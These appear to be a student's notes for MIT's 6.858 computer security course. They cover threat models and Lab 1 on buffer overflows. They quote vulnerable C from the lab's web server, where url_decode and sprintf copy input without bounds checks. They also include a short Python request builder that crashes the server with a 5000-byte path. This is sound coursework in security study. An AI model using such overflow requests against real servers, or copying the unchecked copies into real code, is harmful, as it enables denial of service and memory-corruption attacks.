# 6.858 Spring 2022 

- (Website 6.858 / Spring 2022)[https://css.csail.mit.edu/6.858/2022]
- (Video Lectures)[https://www.youtube.com/watch?v=073D9t3ltEw]

# Introduction

**Security**: The system works despite an adversary.

## Why is security hard?

Bugs, social engineering, guessing passwords, stealing laptops, monitoring networks...

- **Positive goal**: Can the TAs access the grades file?
- **Negative goal**: Only the TAs should access the grades file.

## Thread model

- **Goal**: Only Alice can access file F.
- **Threat model**: Assumptions about who you are up against.
- **Policy**: File system permissions, 2FA, login.
- **Mechanism**: The policy implementation.

## Good practices

- Monitor attacks.
- Reuse components.
- Conduct post-mortems.

## Attack x Defense

- **Defense**: Consider all possible attacks.
- **Attack**: Find one successful attack.

You don't need a perfect defense; you just need: **Cost to attack > Value.**

**Convenience, usability, and sharing** vs. **Security.**

# LAB 1: Buffer overflows

## Part 1

### Exercise 1

### Exploits

#### Exploit 1

In `zookd.c` the `reqpath` buffer can be exploited

```c
char reqpath[4096];

if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
    return http_err(fd, 500, "http_request_line: %s", errmsg);
```

In the `url_decode` the contents from the path `sp1` are moved into `reqpath`, without size validation

```c
url_decode(reqpath, sp1);
```

We can pass a big path to exploit this vulnerability

#### Exploit 2

In `http.c` the `value` and `envvar` buffers can be exploited

```c
const char *http_request_headers(int fd)
{
    static char buf[8192];      /* static variables are not on the stack */
    int i;
    char value[512];
    char envvar[512];
```

The `envvar` buffer has 512 bytes and buf 8192 bytes

```c
    if (strcmp(buf, "CONTENT_TYPE") != 0 &&
        strcmp(buf, "CONTENT_LENGTH") != 0) {
        sprintf(envvar, "HTTP_%s", buf);
        setenv(envvar, value, 1);
    } else {
        setenv(buf, value, 1);
    }
```

We can pass a big header to exploit this vulnerability

- In `http.c` the `pn` buffer can't be exploited by a buffer overflow but maybe we can use other techniques to get file access
- In `http.c` environment variables are set based on HTTP headers this can be very dangerous 

### Exercise 2

We can send a 5000 byte path to crash the program 

```python
def build_exploit(shellcode):
    path = b"A" * 5000
    req =   b"GET /" + path + b" HTTP/1.0\r\n" + \
            b"\r\n"
    return req
```

# Smashing the stack in the 21st Century 

https://www.youtube.com/watch?v=cJDRShqtTbk


